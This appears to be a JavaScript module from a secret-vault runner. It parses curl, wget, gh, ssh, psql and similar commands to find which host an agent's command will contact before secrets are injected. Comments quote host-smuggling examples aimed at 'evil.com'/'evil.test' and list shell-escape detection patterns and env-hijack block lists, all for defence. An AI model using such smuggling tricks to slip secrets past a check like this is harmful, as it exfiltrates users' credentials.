const SSH_KEYED = ['-o', '-F', '-J', '-W', '-L', '-R', '-D', '-S', '-I'];   // lane vault-run-door: where the connection goes / what it runs (ProxyCommand) — the value is the shape; round 11 (MAJOR): `-I <pkcs11.so>` loads agent-written code with the secret in env ⇒ opaque (its value was consumed but never read before)
// lane vault-agent-own (round 2): the flags whose VALUE is the next word, so a value is never read as a target (`curl -X POST`,
// `wget -O out.html`); a flag missing here only makes its value look like a target — a card more, never one less
// int361 (the vault pair, 主开发's ruling): + vault-use-grants' `--alt-svc` — its value (a cache FILE) is never read as a positional host; the flag stays keyed (opaque) too
const CURL_VALUE_FLAGS = ['-A', '--user-agent', '-b', '--cookie', '-c', '--cookie-jar', '-C', '--continue-at', '-d', '--data', '--data-ascii', '--data-binary', '--data-raw', '--data-urlencode', '--json', '-D', '--dump-header', '-e', '--referer', '-E', '--cert', '--cert-type', '--key', '--key-type', '--cacert', '--capath', '--ciphers', '-F', '--form', '--form-string', '-H', '--header', '-m', '--max-time', '--connect-timeout', '-o', '--output', '--output-dir', '-r', '--range', '-T', '--upload-file', '-u', '--user', '-U', '--proxy-user', '-w', '--write-out', '-X', '--request', '-y', '--speed-time', '-Y', '--speed-limit', '-z', '--time-cond', '--retry', '--retry-delay', '--retry-max-time', '--limit-rate', '--max-filesize', '--max-redirs', '--oauth2-bearer', '--aws-sigv4', '--interface', '--local-port', '-Q', '--quote', '--stderr', '--trace', '--trace-ascii', '--pinnedpubkey', '--pass', '--proto', '--proto-redir', '--variable', '--url-query', '--url', '--unix-socket', '--abstract-unix-socket', '--dns-servers', '--netrc-file', '--hsts', '--etag-save', '--etag-compare', '--alt-svc'];
const WGET_VALUE_FLAGS = ['-O', '--output-document', '-o', '--output-file', '-a', '--append-output', '-P', '--directory-prefix', '-U', '--user-agent', '--header', '--user', '--password', '--http-user', '--http-password', '--post-data', '--post-file', '--body-data', '--body-file', '--method', '-t', '--tries', '-T', '--timeout', '--load-cookies', '--save-cookies', '--ca-certificate', '--certificate', '--private-key', '-w', '--wait', '-Q', '--quota', '--limit-rate', '-l', '--level', '-A', '--accept', '-R', '--reject', '-D', '--domains', '--exclude-domains', '-e', '--execute', '-B', '--base', '--bind-address', '--config', '-i', '--input-file'];
const HTTPIE_VALUE_FLAGS = ['-a', '--auth', '-A', '--auth-type', '-o', '--output', '--session', '--session-read-only', '--cert', '--cert-key', '--cert-key-pass', '--ciphers', '--ssl', '--timeout', '--max-redirects', '--boundary', '--format-options', '-p', '--print', '-P', '--history-print', '--pretty', '-s', '--style', '--response-charset', '--response-mime', '--default-scheme', '--verify', '--proxy', '--raw'];
const KNOWN_TOOLS = Object.freeze([
  { name: 'curl', proxyEnv: true, bareHosts: 'all', globs: true, urlFlags: ['--url'], blindPrefixes: ['--expand-'], valueFlags: ['-x', '--proxy', '--preproxy', '--proxy1.0', '--resolve', '--connect-to', '--socks4', '--socks4a', '--socks5', '--socks5-hostname', '--doh-url', '-K', '--config', ...CURL_VALUE_FLAGS], keyed: ['-x', '--proxy', '--preproxy', '--proxy1.0', '--resolve', '--connect-to', '--socks4', '--socks4a', '--socks5', '--socks5-hostname', '--doh-url', '--unix-socket', '--abstract-unix-socket', '--dns-servers', '--alt-svc', '--interface'], configFlags: ['-K', '--config'], fileFlags: ['--cacert', '--capath', '-E', '--cert', '--key', '--netrc-file', '--hsts', '--etag-save', '--etag-compare'], configFileKeys: ['alt-svc', 'cacert', 'capath', 'cert', 'config', 'cookie-jar', 'crlfile', 'dump-header', 'egd-file', 'etag-compare', 'etag-save', 'hsts', 'key', 'knownhosts', 'libcurl', 'netrc-file', 'output', 'output-dir', 'proxy-cacert', 'proxy-capath', 'proxy-cert', 'proxy-crlfile', 'proxy-key', 'pubkey', 'random-file', 'ssl-sessions', 'stderr', 'trace', 'trace-ascii', 'upload-file'], configDataKeys: ['data', 'data-ascii', 'data-binary', 'header', 'json', 'proxy-header', 'write-out'], configAtNameKeys: ['data-urlencode', 'url-query', 'variable'], configCookieKeys: ['cookie'], configNetrcKeys: ['netrc', 'netrc-optional'], configRouteKeys: ['abstract-unix-socket', 'connect-to', 'dns-servers', 'doh-url', 'ipfs-gateway', 'preproxy', 'proxy', 'proxy1.0', 'resolve', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'unix-socket', 'url'], configRedirectKeys: ['interface', 'location', 'location-trusted', 'proto-redir'], configFormKeys: ['form'], configExpandPrefix: 'expand-', configShort: { K: 'config', E: 'cert', b: 'cookie', d: 'data', c: 'cookie-jar', D: 'dump-header', o: 'output', T: 'upload-file', H: 'header', F: 'form', w: 'write-out', x: 'proxy', n: 'netrc', L: 'location' } },   // round 19 (item 4): DERIVED from `curl --help all` (every <file>/<dir>/<data>@/<name=content>@/<url>@ option, both spellings; the short map pins -K/-E/-b/-d/…) and PINNED by the census in test-vault-run-model (a curl that adds a file-reading option → red by name); route directives (url/connect-to/resolve/proxy) are ROUTE HOSTS, location/proto-redir → noAlways redirect, a {{var}} host → blind   // round 3: a flag that redirects the connection off the URL's host (--alt-svc / --interface) is keyed; a value that is an agent-writable FILE (cert / ca / netrc / hsts cache) is a config class — blind unless it is the vault's own $VAULT_FILE   // int361: + vault-use-grants' --proxy1.0 (argv value/keyed — routes like -x)
  { name: 'wget', proxyEnv: true, bareHosts: 'all', prefixOpts: true, valueFlags: WGET_VALUE_FLAGS, keyed: ['-e', '--execute', '-B', '--base', '--bind-address', '--use-askpass'], configFlags: ['--config', '-i', '--input-file', '--input-metalink'], fileFlags: ['--ca-certificate', '--certificate', '--private-key', '--load-cookies', '--save-cookies'] },   // round 3 (m2): --input-metalink fetches every URL in its file (like -i); a cert / cookie file the agent writes is a config class
  { name: 'http', aka: ['https', 'httpie'], proxyEnv: true, bareHosts: 'first', valueFlags: HTTPIE_VALUE_FLAGS, keyed: ['--proxy'] },
  { name: 'gh', hosts: ['api.github.com', 'github.com'], hostEnv: ['GH_HOST'], sub: 2, proxyEnv: true, valueFlags: ['-R', '--repo', '--hostname'], hostFlags: ['--hostname'], repoFlags: ['-R', '--repo'], repoEnv: ['GH_REPO'], urlArgSubs: [['api']], freeText: true, blindSubs: [['repo', 'clone'], ['repo', 'fork'], ['repo', 'sync'], ['pr', 'checkout'], ['extension', 'install'], ['extension', 'upgrade']], blindFlagSubs: [{ sub: ['pr', 'merge'], longs: ['--delete-branch'], shorts: ['-d'] }, { sub: ['repo', 'create'], longs: ['--push', '--clone'], shorts: ['-c'] }], needFlagSubs: [{ sub: ['pr', 'create'], need: ['--head', '-H'], repo: true }], runSeal: { configDirEnv: 'GH_CONFIG_DIR', hostEnv: 'GH_HOST', credRef: 'GH_TOKEN', credEnvOther: 'GH_ENTERPRISE_TOKEN', childEnv: { GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1', GIT_TERMINAL_PROMPT: '0' } }, grammarVersion: '2.102.0', toolSha256: '7469124f706944133d6a169691dd1c6c3511b12e85878d255e044e2948df4c9b', envAllow: ["GH_REPO","GH_FORCE_TTY","NO_COLOR","CLICOLOR","TERM","LANG","TZ"], envAllowRe: ["^LC_[A-Z]+$"], envHijack: ["BROWSER","EDITOR","GH_BROWSER","GH_EDITOR","GH_PAGER","GH_PATH","GIT_EDITOR","PAGER","VISUAL"], grammar: {
      "api": {"value":["--cache","--field","--header","--hostname","--input","--jq","--method","--preview","--raw-field","--template","-F","-H","-X","-f","-p","-q","-t"],"repoValues":[],"spec":0,"host":null},
      "config get": {"default":1},
      "issue close": {"value":["--comment","--duplicate-of","--reason","--repo","-R","-c","-r"],"repoValues":["--repo","-R"],"spec":0,"host":null,"urlArg":1},
      "issue comment": {"value":["--attach","--body","--body-file","--repo","-F","-R","-b"],"repoValues":["--repo","-R"],"spec":0,"host":null,"urlArg":1,"launch":["--editor","--web","-e","-w"]},
      "issue create": {"value":["--assignee","--attach","--blocked-by","--blocking","--body","--body-file","--label","--milestone","--parent","--project","--recover","--repo","--template","--title","--type","-F","-R","-T","-a","-b","-l","-m","-p","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--editor","--web","-e","-w"]},
      "issue list": {"value":["--app","--assignee","--author","--jq","--json","--label","--limit","--mention","--milestone","--repo","--search","--state","--template","--type","-A","-L","-R","-S","-a","-l","-m","-q","-s","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--web","-w"]},
      "issue view": {"value":["--jq","--json","--repo","--template","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"urlArg":1,"launch":["--web","-w"]},
      "label list": {"value":["--jq","--json","--limit","--order","--repo","--search","--sort","--template","-L","-R","-S","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--web","-w"]},
      "org list": {"default":1},
      "pr checks": {"value":["--interval","--jq","--json","--repo","--template","-R","-i","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"urlArg":1,"launch":["--web","-w"]},
      "pr comment": {"value":["--attach","--body","--body-file","--repo","-F","-R","-b"],"repoValues":["--repo","-R"],"spec":0,"host":null,"urlArg":1,"launch":["--editor","--web","-e","-w"]},
      "pr create": {"value":["--assignee","--attach","--base","--body","--body-file","--head","--label","--milestone","--project","--recover","--repo","--reviewer","--template","--title","-B","-F","-H","-R","-T","-a","-b","-l","-m","-p","-r","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--editor","--web","-e","-w"]},
      "pr list": {"value":["--app","--assignee","--author","--base","--head","--jq","--json","--label","--limit","--repo","--search","--state","--template","-A","-B","-H","-L","-R","-S","-a","-l","-q","-s","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--web","-w"]},
      "pr status": {"value":["--jq","--json","--repo","--template","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "pr view": {"value":["--jq","--json","--repo","--template","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"urlArg":1,"launch":["--web","-w"]},
      "release list": {"value":["--jq","--json","--limit","--order","--repo","--template","-L","-O","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "release view": {"value":["--jq","--json","--repo","--template","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--web","-w"]},
      "repo list": {"default":1},
      "repo view": {"value":["--branch","--jq","--json","--template","-b","-q","-t"],"repoValues":[],"spec":1,"host":null,"launch":["--web","-w"]},
      "run list": {"value":["--branch","--commit","--created","--event","--jq","--json","--limit","--repo","--status","--template","--user","--workflow","-L","-R","-b","-c","-e","-q","-s","-t","-u","-w"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "run view": {"value":["--attempt","--job","--jq","--json","--repo","--template","-R","-a","-j","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--web","-w"]},
      "run watch": {"value":["--interval","--repo","-R","-i"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "search code": {"value":["--extension","--filename","--jq","--json","--language","--limit","--match","--owner","--repo","--size","--template","-L","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--web","-w"]},
      "search commits": {"value":["--author","--author-date","--author-email","--author-name","--committer","--committer-date","--committer-email","--committer-name","--hash","--jq","--json","--limit","--order","--owner","--parent","--repo","--sort","--template","--tree","--visibility","-L","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--web","-w"]},
      "search issues": {"value":["--app","--assignee","--author","--closed","--commenter","--comments","--created","--interactions","--involves","--jq","--json","--label","--language","--limit","--match","--mentions","--milestone","--order","--owner","--project","--reactions","--repo","--search-type","--sort","--state","--team-mentions","--template","--updated","--visibility","-L","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--web","-w"]},
      "search prs": {"value":["--app","--assignee","--author","--base","--checks","--closed","--commenter","--comments","--created","--head","--interactions","--involves","--jq","--json","--label","--language","--limit","--match","--mentions","--merged-at","--milestone","--order","--owner","--project","--reactions","--repo","--review","--review-requested","--reviewed-by","--sort","--state","--team-mentions","--template","--updated","--visibility","-B","-H","-L","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--web","-w"]},
      "search repos": {"default":1,"launch":["--web","-w"]},
      "secret list": {"value":["--app","--env","--jq","--json","--org","--repo","--template","-R","-a","-e","-o","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "ssh-key list": {"default":1},
      "variable list": {"value":["--env","--jq","--json","--org","--repo","--template","-R","-e","-o","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "workflow list": {"value":["--jq","--json","--limit","--repo","--template","-L","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "workflow view": {"value":["--ref","--repo","-R","-r"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--web","-w"]},
    }, passDashes: true },   // round 3: gh extension install/upgrade runs code; a verb+flag that drives git (pr merge --delete-branch, repo create --push/--clone) is blind; round 5: the gh flag knowledge is GENERATED from gh's own --help per verb (scripts/gen-gh-grammar.mjs → `grammar`; test-vault-run-model ⑤c re-runs the same parse against the live gh and diffs — a verb / value flag / bool / positional shape / hostname short drift is RED by name). shapeOf reads it: a value flag consumes its argument in ANY spelling so it is not misread as the <...repository> positional (repo edit -d x evil.com/o/r), a `spec` verb reads positionals[0] as HOST/OWNER/REPO (the table caught skill install/preview + label clone, not only repo's verbs; gh api <path> stays a path), a `host` short is --hostname (gh auth status -h evil.com), and a cluster's =value binds to the LAST letter only so an earlier git-driving bool is still set true (gh pr merge -dm=false). ROUND 6 (FAIL CLOSED — do not model cobra): the reader reads ONLY the spellings it can read with certainty and BLINDS the rest of gh. A dash BEFORE the verb words, or a verb the table does not carry, ⇒ vg null ⇒ blind (it asks — asking is cheap, a silent send is the one thing the vault must never do). So the table now carries EVERY host-reaching verb (gen-gh-grammar.mjs walks the WHOLE live tree): a `<repository>`/`<name>` positional (spec), --hostname (host), or a value the help TYPEs as a repository (repoValues — repo create --template, the inherited -R) — the agent's own gh (issue list, pr merge, repo view, api) stays ok:own while an unknown or relocated spelling asks. grammar + grammarVersion are GENERATED (node scripts/gen-gh-grammar.mjs --write, pinned to the runner's gh); ⑤c re-parses the whole live tree IN PARALLEL and diffs the version AND the table — any drift RED by name. gh api <path> is a path under the default host, never a host   // round 2b: these drive `git` (the project's .git/config + hooks, like the git row); args after `--` go to git. ROUND 7: a dash-before-verb / unknown / extension verb still BLINDS, but a verb the help PROVES reaches only the default host is listed {default:1} and runs ok:own (no FALSE blind); a positional or value the help TYPEs OR DESCRIBES as a repository (incl. the scp-like git@HOST:O/R and ssh/git/http/https URLs, read by repoHostOf exactly as go-gh's repository.Parse) asks its host; the program-naming env vars (envHijack, DERIVED from `gh help environment`: GH_BROWSER/GH_EDITOR/GH_PAGER + the generic BROWSER/EDITOR/VISUAL/PAGER) are env_refused
  { name: 'git', sub: 1, scpLike: true, proxyEnv: true, confDest: true, valueFlags: ['-C', '-c', '--git-dir', '--work-tree', '--namespace', '--config-env'], keyed: ['-c', '--config-env'] },
  { name: 'aws', hosts: ['*.amazonaws.com'], sub: 2, proxyEnv: true, valueFlags: ['--profile', '--region', '--output'] },
  { name: 'gcloud', hosts: ['*.googleapis.com'], sub: 3, proxyEnv: true, valueFlags: ['--project', '--account', '--format', '--configuration'] },
  { name: 'az', hosts: ['management.azure.com', 'login.microsoftonline.com'], sub: 2, proxyEnv: true, valueFlags: ['--subscription', '-g', '--resource-group', '-o', '--output'] },
  { name: 'npm', hosts: ['registry.npmjs.org'], sub: 1, proxyEnv: true, runsProject: true },
  { name: 'pip', hosts: ['pypi.org', 'files.pythonhosted.org'], sub: 1, proxyEnv: true, runsProject: true },
  { name: 'docker', hosts: ['registry-1.docker.io'], sub: 1, registry: true, proxyEnv: false, runsProject: true },
  { name: 'kubectl', sub: 1, proxyEnv: true, hostFlags: ['-s', '--server'], valueFlags: ['-n', '--namespace', '--context', '--cluster', '--user', '-o', '--output', '-l', '--selector', '-f', '--filename', '-c', '--container', '--kubeconfig', '-s', '--server'], configFlags: ['--kubeconfig'] },
  { name: 'psql', hostFlags: ['-h', '--host'], hostEnv: ['PGHOST', 'PGHOSTADDR'], conninfo: true, proxyEnv: false, prefixOpts: true, valueFlags: ['-c', '--command', '-f', '--file', '-d', '--dbname', '-o', '--output'], configFlags: ['-f', '--file'], scriptFlags: ['-c', '--command', '-o', '--output'], escapes: /^[\\|]/ },   // round 2: `-c '\! …'` is psql's shell (a -c starting with a backslash is a meta-command); `-o '|cmd'` pipes to a shell; a -f file may hold one
  { name: 'mysql', hostFlags: ['-h', '--host'], hostEnv: ['MYSQL_HOST'], proxyEnv: false, prefixOpts: true, valueFlags: ['-e', '--execute'], configFlags: ['--defaults-file', '--defaults-extra-file', '--login-path'], scriptFlags: ['-e', '--execute'], escapes: /\\[!.]|\b(?:system|source)\b/i },   // round 2: the client's `system` / `\!` / `source`
  { name: 'rclone', sub: 1, proxyEnv: true, confDest: true, valueFlags: ['--config'], configFlags: ['--config'] },
  { name: 'ssh', sshTarget: true, proxyEnv: false, valueFlags: SSH_VALUE_FLAGS, keyed: SSH_KEYED, configFlags: ['-F'] },
  { name: 'sftp', sshTarget: true, proxyEnv: false, valueFlags: SSH_VALUE_FLAGS, keyed: SSH_KEYED, configFlags: ['-F', '-b'] },   // round 2: -b = a batch file (its `!command` is a local shell)
  { name: 'scp', scpLike: true, copies: true, proxyEnv: false, valueFlags: SSH_VALUE_FLAGS, keyed: SSH_KEYED, configFlags: ['-F'] },
  { name: 'rsync', scpLike: true, copies: true, proxyEnv: false, valueFlags: ['-e', '--rsh'], keyed: ['-e', '--rsh'] },
].map((r) => Object.freeze({ argvOnly: false, ...r })));

/** argv[0] (and the door's resolution of it) → its lookup name: the basename, lower case, no `.exe`. */
const toolNameOf = (argv0, resolved = null) => String(resolved || argv0 || '').split(/[\\/]/).pop().toLowerCase().replace(/\.exe$/, '');
const findIn = (list, n, key = (r) => r.names) => list.find((r) => key(r).includes(n)) || list.find((r) => key(r).includes(n.replace(/[\d.]+$/, ''))) || null;
const knownToolOf = (name) => (name ? findIn(KNOWN_TOOLS, name, (r) => [r.name, ...(r.aka || [])]) : null);
// round 7 (MAJOR 4): the union of every known tool's own program-naming env vars (gh's envHijack, GENERATED from its help) —
// refused by name in envRefusedOf alongside the hand-kept cross-tool ENV_HIJACK (a belt). A GH_ name is namespaced, so a
// machine-wide union is correct and the census pins the gh list against the live gh.
const TOOL_ENV_HIJACK = Object.freeze(new Set(KNOWN_TOOLS.flatMap((r) => r.envHijack || [])));
/** → { code, cls, name, words } | null. */
function refusedTool(argv0, { resolved = null } = {}) {
  const name = toolNameOf(argv0, resolved);
  if (!name) return refuse('no_command');
  const row = findIn(REFUSING, name) || REFUSING.find((r) => r.prefix && name.startsWith(r.prefix)) || null;
  return row ? refuse(row.code, { cls: row.cls, tool: name }) : null;
}
/** 'shell' | 'interpreter' | 'tool' — a shell's or an interpreter's whole command line is its program. */
function toolKindOf(name) { const n = String(name || ''); return SHELLS.includes(n) || SHELLS.includes(n.replace(/[\d.]+$/, '')) ? 'shell' : INTERPRETERS.includes(n) || INTERPRETERS.includes(n.replace(/[\d.]+$/, '')) ? 'interpreter' : 'tool'; }

// ── THE PLAN (the request → what the child gets; every refusal by name) ──
const bytesOf = (s) => { let n = 0; for (const ch of String(s)) { const c = ch.codePointAt(0); n += c < 0x80 ? 1 : c < 0x800 ? 2 : c < 0x10000 ? 3 : 4; } return n; };
const pairsOf = (x) => (Array.isArray(x) ? x.map((p) => (Array.isArray(p) ? [String(p[0]), String(p[1] == null ? '' : p[1])] : [String(p && p.name), String(p && p.value != null ? p.value : '')])) : x && typeof x === 'object' ? Object.entries(x).map(([k, v]) => [k, String(v == null ? '' : v)]) : []);
/** The CLI's words → the request. `vibespace-vault run [--env NAME=V]… [--file NAME=vault://…|@template]… [--stdin vault://…]
 *  [--allow-argv] [--on <machine>] [--timeout <s>] [--] <command…>` → { ok, req } | refusal. */
const RUN_FLAGS = Object.freeze(['--env', '--file', '--stdin', '--allow-argv', '--on', '--timeout']);
function timeoutOf(v) { const n = Number(v); return /^\d{1,4}$/.test(String(v)) && n >= 1 && n <= TIMEOUT_MAX_S ? n : null; }
function parseRunArgs(args) {
  const a = (Array.isArray(args) ? args : []).map(String);
  const req = { argv: [], env: [], file: [], stdin: null, allowArgv: false, on: null, timeoutSec: TIMEOUT_DEFAULT_S };
  let i = 0;
  for (; i < a.length; i++) {
    const x = a[i];
    if (x === '--') { i++; break; }
    if (!x.startsWith('--')) break;
    const eq = x.indexOf('='), flag = eq > 0 ? x.slice(0, eq) : x;
    if (!RUN_FLAGS.includes(flag)) return refuse('bad_flag', { flag });
    if (flag === '--allow-argv') { if (eq > 0) return refuse('bad_flag', { flag }); req.allowArgv = true; continue; }
    const v = eq > 0 ? x.slice(eq + 1) : i + 1 < a.length ? a[++i] : null;
    if (v == null) return refuse('bad_flag', { flag });
    if (flag === '--env' || flag === '--file') { const k = v.indexOf('='); if (k < 1) return refuse('bad_flag', { flag }); req[flag.slice(2)].push([v.slice(0, k), v.slice(k + 1)]); }
    else if (flag === '--stdin') { if (req.stdin != null) return refuse('bad_flag', { flag }); req.stdin = v; }
    else if (flag === '--on') req.on = v;
    else { const t = timeoutOf(v); if (t == null) return refuse('bad_flag', { flag }); req.timeoutSec = t; }
  }
  req.argv = a.slice(i);
  return { ok: true, req };
}
/**
 * The request → THE PLAN, or a refusal. `req` = { argv, env, file, stdin, allowArgv, on, resolved, templates } — `env` / `file`
 * as [[NAME, value]] (or { NAME: value }); `resolved` = argv[0] on the agent env's PATH (the door's lookup); `templates` =
 * { <path>: text } for every `--file NAME=@<path>` (the door reads them inside the cwd fence); `timeoutSec` 1–600 (120).
 * → { ok: true, argv, tool, name, kind, row, refs: [ref…], env: [{ name, ref }], plainEnv: [{ name, value }],
 *     files: [{ slot, name|null, ref|null, template|null, text|null }], stdin: ref|null, injection: [..], argvExposed, on, timeoutSec }
 */
function planOf(req = {}) {
  const argv = Array.isArray(req.argv) ? req.argv.map(String) : [];
  if (!argv.length || !argv[0]) return refuse('no_command');
  if (bytesOf(argv.join(' ')) > CMD_MAX) return refuse('cmd_too_long');
  const tr = refusedTool(argv[0]) || (req.resolved ? refusedTool(argv[0], { resolved: req.resolved }) : null);   // lane vault-run-door: the typed name AND the resolved path's
  if (tr) return tr;
  const name = toolNameOf(argv[0], req.resolved), row = knownToolOf(name);
  const refs = new Map(), names = new Set(), env = [], plainEnv = [], files = [], injection = [];
  const add = (r) => { if (!refs.has(r.id)) refs.set(r.id, refOf(r.store, r.entry, r.field)); return refs.get(r.id).ref; };
  const claim = (n, as) => {
    if (!ENV_NAME.test(n)) return refuse('bad_env_name', { name: n });
    if (names.has(n)) return refuse('duplicate_name', { name: n });
    const why = envRefusedOf(n, as, row);
    if (why) return refuse('env_refused', { name: n, why });
    names.add(n); return null;
  };
  for (const [n, v] of pairsOf(req.env)) {
    const sc = scanRefs(v);
    if (sc.bad.length) return refuse('bad_reference', { text: sc.bad[0].text });
    const r = sc.refs.length ? parseRef(v) : null;
    if (sc.refs.length && !r) return refuse('bad_reference', { text: v.slice(0, 80), why: 'an env value is one whole reference (a template file holds the rest)' });
    const no = claim(n, r ? 'env' : 'plain');
    if (no) return no;
    if (r) { env.push({ name: n, ref: add(r) }); injection.push(`env:${n}`); } else plainEnv.push({ name: n, value: v });
  }
  for (const [n, v] of pairsOf(req.file)) {
    const no = claim(n, 'file');
    if (no) return no;
    if (v.startsWith('@')) {
      const p = v.slice(1), t = req.templates && Object.prototype.hasOwnProperty.call(req.templates, p) ? req.templates[p] : null;
      if (!p) return refuse('bad_flag', { flag: '--file' });
      if (typeof t !== 'string') return refuse('template_unread', { template: p });
      if (bytesOf(t) > TEMPLATE_MAX) return refuse('template_too_long', { template: p });
      const sc = scanRefs(t);
      if (sc.bad.length || sc.refs.some((x) => x.form !== 'brace')) return refuse('bad_reference', { text: (sc.bad[0] || sc.refs.find((x) => x.form !== 'brace')).text || '', why: 'a template names a value as $VAULT{<store>/<row>/<field>}' });
      for (const x of sc.refs) add(x);
      files.push({ slot: files.length, name: n, ref: null, template: p, text: t });
    } else {
      const r = parseRef(v);
      if (!r) return refuse('bad_reference', { text: v.slice(0, 80) });
      files.push({ slot: files.length, name: n, ref: add(r), template: null, text: null });
    }
    injection.push(`file:${n}`);
  }
  let stdin = null;
  if (req.stdin != null) { const r = parseRef(String(req.stdin)); if (!r) return refuse('bad_reference', { text: String(req.stdin).slice(0, 80) }); stdin = add(r); injection.push('stdin'); }
  let argvExposed = false;
  for (const a of argv) {
    const sc = scanRefs(a);
    if (sc.bad.length) return refuse('bad_reference', { text: sc.bad[0].text });
    for (const x of sc.refs) {
      if (x.form === 'file' && x.name) { if (!files.some((f) => f.name === x.name)) return refuse('bad_reference', { text: `$VAULT_FILE{${x.name}}`, why: `no --file ${x.name}=… declares it` }); continue; }
      if (x.form === 'file') { const ref = add(x); if (!files.some((f) => f.name === null && f.ref === ref)) { files.push({ slot: files.length, name: null, ref, template: null, text: null }); injection.push('file:$VAULT_FILE'); } continue; }
      const iv = injectionOf('argv', { allowArgv: !!req.allowArgv, row });
      if (!iv.ok) return { ...iv, tool: name };
      add(x); argvExposed = true;
    }
  }
  if (argvExposed) injection.push('argv');
  if (!refs.size) return refuse('no_reference');
  return { ok: true, argv, tool: String(req.resolved || argv[0]), name, kind: toolKindOf(name), row, refs: [...refs.values()], env, plainEnv, files, stdin, injection: [...new Set(injection)], argvExposed, on: req.on ? String(req.on) : null, timeoutSec: timeoutOf(req.timeoutSec) || TIMEOUT_DEFAULT_S, programWritable: req.programWritable === true, win32: req.win32 === true };   // round 7 item 1c / round 9 (MINOR): `win32` = the platform where the command RUNS. The hub is POSIX and NO caller sets it today (the door's local run path never passes it ⇒ the win32 branch is reachable only from a test), so a one-letter `X:path` reads as a host. The caller that WOULD pass it is the DEVICE road — a run dispatched to a paired win32 machine would carry that machine's reported platform — but the door returns `device_road_later` for a remote / `--on` run, so it is not wired yet.
}
/** The door's LAST step over planOf's answer (`run`) — the only object that holds values (never stored, never logged): the
 *  child's argv / env / stdin and each file's content. `valueOf(ref)` = the vault's value; `pathOf(slot)` = the door's 0700 run dir + a name. */
function materialize(run, { valueOf, pathOf }) {
  const slotOf = (x) => (run.files.find((f) => (x.name ? f.name === x.name : f.name === null && f.ref === x.ref)) || {}).slot;
  const argv = run.argv.map((a) => {
    const { refs } = scanRefs(a);
    let out = '', i = 0;
    for (const x of refs) { out += a.slice(i, x.at) + (x.form === 'file' ? String(pathOf(slotOf(x))) : run.argvExposed ? String(valueOf(x.ref)) : x.ref); i = x.at + x.len; }
    return out + a.slice(i);
  });
  const env = {};
  for (const e of run.plainEnv) env[e.name] = e.value;
  for (const e of run.env) env[e.name] = String(valueOf(e.ref));
  for (const f of run.files) if (f.name) env[f.name] = String(pathOf(f.slot));
  const files = run.files.map((f) => ({ slot: f.slot, path: String(pathOf(f.slot)), content: f.template != null ? renderTemplate(f.text, valueOf) : String(valueOf(f.ref)) }));
  return { argv, env, files, stdin: run.stdin ? String(valueOf(run.stdin)) + '\n' : null };
}

// ── THE SHAPE KEY (decision ④) ──
// round 18/19 (item 1+2 BLOCKER): a URL's host is what the tool's OWN parser says — the WHATWG `URL`, never a hand-written regex.
// URL_RE's userinfo pattern stopped at a `'` / `"` so it read `https://ghe.example.test'@evil.test/…` as ghe.example.test while Go
// and curl read evil.test. Round 19: the locator runs a URL token to WHITESPACE only (the shell already split argv; inside one word
// nothing ends a URL — a `"`, `<`, `>` or backtick is LEGAL inside userinfo, which curl/wget/WHATWG read the host PAST), and
// urlParse (new URL) is the ONE authority on the host. A URL with ANY http(s) userinfo is never a route (url_userinfo, judged on ROUTE
// words only); a URL the WHATWG parser REJECTS (an out-of-range port, a non-DNS name, a label > 63 / a name > 253, an empty host, a
// `{{var}}`) is a BLIND authority — bad_host at the door, never a dropped host (Go/curl would still dial it). The divergence corpus is
// a DOOR-level fuzz leg (whole argv words → routeHosts / userinfo / blind, compared to new URL, Go's trace and curl's %{url.host}).
const AUTHORITY_UNSAFE = /[\\%\u0000-\u0020\u007f]|[^\u0000-\u007f]/;   // round 24 (the ONE parser must agree with the TOOL, not the WHATWG spec; vault-use-grants r3, wire-proven curl 8.18 + a loopback listener): a byte the tool (curl / wget / git / go-gh) KEEPS in a URL authority but the WHATWG `new URL()` strips, IDNA-maps or re-reads — a `\` (WHATWG turns it into `/` so the real host hides after it as curl's userinfo), a percent-escape, any control / space (WHATWG strips an embedded tab / newline), DEL, or a non-ASCII byte. The reader is NOT certain where the tool connects ⇒ the authority is BLIND (bad_host), never a guessed host
const URL_FIND_RE = /\b([a-z][a-z0-9+.-]{0,31}):\/\/[^ \t\n\r\f\v]+/gi;   // round 23 (the refuted finding, real + pre-existing): the token runs to ASCII whitespace ONLY — JS's \S stops at U+00A0/U+3000/U+2028/… so `http://own-host\u3000@evil` was read as own-host (no userinfo, not blind) while curl dials evil; a non-ASCII space now stays IN the token ⇒ urlParse rejects it (bad_host) / blindAuthority blinds it. The host is read by urlParse, never this regex
const URL_TRAIL = /[),;!'"<>`]+$/;   // drop trailing prose terminators (a standalone argv token has none); the attack bytes are always mid-token (…<byte>@host/path), so a trailing strip never reopens the hole
const normHost = (h, port = null) => { const x = String(h || '').toLowerCase().replace(/\.$/, ''); return x && x.length <= 253 && !/[{}]/.test(x) && !x.split('.').some((l) => l.length > 63) ? (port ? `${x}:${port}` : x) : null; };   // round 19 (item 1): a name > 253 chars or a label > 63 is not valid DNS (gh/curl still CONTACT it) — fail-CLOSED to bad_host; a `{{var}}` is never a host
